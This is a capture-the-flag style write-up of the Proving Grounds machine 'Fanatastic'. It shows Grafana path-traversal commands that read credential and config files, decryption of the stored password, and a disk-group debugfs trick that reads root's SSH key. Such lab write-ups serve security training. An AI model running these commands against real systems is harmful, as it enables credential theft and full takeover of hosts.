Fanatastic - Proving Grounds Write-up

Posted on January 27th, 2026

We start by finding the service version for Grafana in the "Reset password" section of the website.

We then find a LFI vulnerability with searchsploit:

searchsploit grafana

We test it out by reading the /etc/passwd file.

searchsploit -m 50581

python3 50581.py -H http://192.168.177.181:3000

We take note of the user "sysadmin".

After a little bit of digging, we discover that Grafana stores its credentials in a SQLite3 database file at /var/lib/grafana/grafana.db.

After reading this post: https://nusgreyhats.org/posts/writeups/a-not-so-deep-dive-in-to-grafana-cve-2021-43798/ we learn that the password stored in the grafana.db file can be decrypted with a key located in /etc/grafana/grafana.ini. We extract both the password and the key from each respective file.

curl "http://192.168.177.181:3000/public/plugins/text/../../../../../../../../../etc/grafana/grafana.ini" -s --path-as-is --output - | grep secret_key

curl "http://192.168.177.181:3000/public/plugins/text/../../../../../../../../../var/lib/grafana/grafana.db" -s --path-as-is --output - | grep -a basicAuth

We then decrypt the password using a function from the Grafana source code. We first copy the grafana/pkg/util/encryption.go file from its GitHub repository to our machine, remove the encrypt function and its imports, and create a new main function.

Our created function calls the decrypt function that was originally included in the file and decrypts the password.

go run test1.go

We can now use the decrypted password to SSH into the machine as user sysadmin.

ssh sysadmin@192.168.177.181

We quickly notice that we are part of the disk group.

whoami

groups

The permissions assigned to users in this group allow us to read any file by accessing the filesystem directly, bypassing any file permissions or restrictions.

We start by locating the main partition:

df -h

We then use the debugfs command to read the SSH key of the root user.

debugfs /dev/sda2

cat /root/.ssh/id_rsa

We use the key to connect to the machine via SSH as root.

ssh root@192.168.177.181 -i test
